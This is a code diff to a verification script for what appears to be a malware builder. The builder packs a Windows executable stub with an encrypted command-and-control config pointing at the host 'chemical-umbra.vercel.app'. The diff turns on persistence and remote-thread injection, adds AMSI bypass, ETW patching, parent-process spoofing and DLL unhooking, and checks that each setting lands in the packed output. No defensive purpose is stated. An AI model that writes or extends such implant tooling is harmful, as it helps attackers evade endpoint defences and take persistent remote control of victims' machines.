@@ -1,3 +1,4 @@
+// Verify wrap: stub MZ + quoted trailer + optional carrier.
 const fs = require('fs')
 const path = require('path')
 
@@ -11,10 +12,11 @@ function marshal(cfg) {
   const useTls = cfg.useTls || port === '443' ? 'true' : 'false'
   const json =
     `{"c2_host":${esc(cfg.host)},"c2_port":${esc(port)},"use_tls":${esc(useTls)},` +
-    `"sleep_interval":${esc('15')},"jitter":${esc('20')},"persistence":${esc('false')},` +
-    `"hide_console":${esc('true')},"key":${esc('')},"injection_method":${esc('none')},` +
+    `"sleep_interval":${esc('15')},"jitter":${esc('20')},"persistence":${esc('true')},` +
+    `"hide_console":${esc('true')},"key":${esc('')},"injection_method":${esc('crt')},` +
     `"anti_debug":${esc('false')},"anti_vm":${esc('false')},` +
-    `"sleep_obfuscation":${esc('true')}}`
+    `"sleep_obfuscation":${esc('true')},"amsi_bypass":${esc('true')},"etw_patch":${esc('true')},` +
+    `"ppid_spoof":${esc('true')},"dll_unhook":${esc('true')}}`
   return Buffer.from(json, 'utf8')
 }
 
@@ -64,15 +66,14 @@ const { bytes, json } = wrap(stub, carrier, { host: 'chemical-umbra.vercel.app',
 const got = decrypt(bytes)
 if (!got) { console.error('FAIL decrypt'); process.exit(1) }
 if (got !== json) { console.error('FAIL mismatch', got, json); process.exit(1) }
-if (!got.includes('"c2_host":"chemical-umbra.vercel.app"')) { console.error('FAIL host'); process.exit(1) }
-if (!got.includes('"use_tls":"true"')) { console.error('FAIL tls'); process.exit(1) }
-if (!got.includes('"anti_vm":"false"')) { console.error('FAIL anti_vm'); process.exit(1) }
+const need = ['"c2_host":"chemical-umbra.vercel.app"', '"use_tls":"true"', '"anti_vm":"false"', '"injection_method":"crt"', '"amsi_bypass":"true"', '"dll_unhook":"true"', '"ppid_spoof":"true"', '"persistence":"true"']
+for (const n of need) {
+  if (!got.includes(n)) { console.error('FAIL missing', n, got); process.exit(1) }
+}
 const fi = bytes.indexOf(FILE_MAGIC)
 if (fi < 0) { console.error('FAIL no carrier magic'); process.exit(1) }
 const cl = bytes.readUInt32LE(fi + 8)
 const car = bytes.subarray(fi + 12, fi + 12 + cl)
 if (!car.equals(carrier)) { console.error('FAIL carrier'); process.exit(1) }
 if (bytes[0] !== 0x4d) { console.error('FAIL out not MZ'); process.exit(1) }
-fs.writeFileSync(path.join(__dirname, '..', 'test_payload.exe'), bytes)
 console.log('WRAP_OK size', bytes.length, 'stub', stub.length, 'json', json.length)
-console.log('TRAILER', got)
